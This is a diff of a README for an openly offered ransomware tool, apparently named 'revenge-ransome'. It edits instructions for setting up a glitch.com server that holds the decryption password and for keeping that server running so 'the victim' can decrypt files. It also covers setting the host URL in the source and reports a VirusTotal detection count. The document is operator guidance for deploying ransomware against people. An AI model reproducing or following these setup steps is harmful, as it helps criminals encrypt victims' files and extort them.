@@ -39,12 +39,12 @@ const listener = app.listen(3000, () => {
 });
  
 ```
-<br>For the website for decrypting files you need to modify Form1: `string host = "website url, glitch can be used, express app example in readme";` this part and put the url exemple: `https://nameofyourproject.glitch.me`<br>
-- You can use [glitch.com](https://glitch.com) to create projects to get the decrypt password, if you want fresh project [clickhere](https://glitch.com/edit/#!/remix/revenge-ransome), but make sure to make the project 24/7 by using service like uptimerobot.
+- You can use [glitch.com](https://glitch.com) to create projects to get the decrypt password, if you want fresh project [clickhere](https://glitch.com/edit/#!/remix/revenge-ransome), but make sure to make the project 24/7 by using service like [UptimerBot](https://uptimerobot.com/) or the victim won't be able to decrypt his files.
+<br>You need to modify the host string Form1: `string host = "website url, glitch can be used, express app example in readme";` this part and put the url exemple: `https://nameofyourproject.glitch.me`<br>
 
 
 # Detection
-15/72
+31/72
 [Virustotal Scan Result](https://www.virustotal.com/gui/file/b74d62a432a9011e2d2c8cf16790a21bd0253ba5d5df09c08e993020985ddc1c/detection)
 
 ![virustotal](https://g.top4top.io/p_1614y4m991.png)
@@ -58,4 +58,4 @@ const listener = app.listen(3000, () => {
 
 
 
-- Now supports encrypting folders .
+- Now supports encrypting folders.
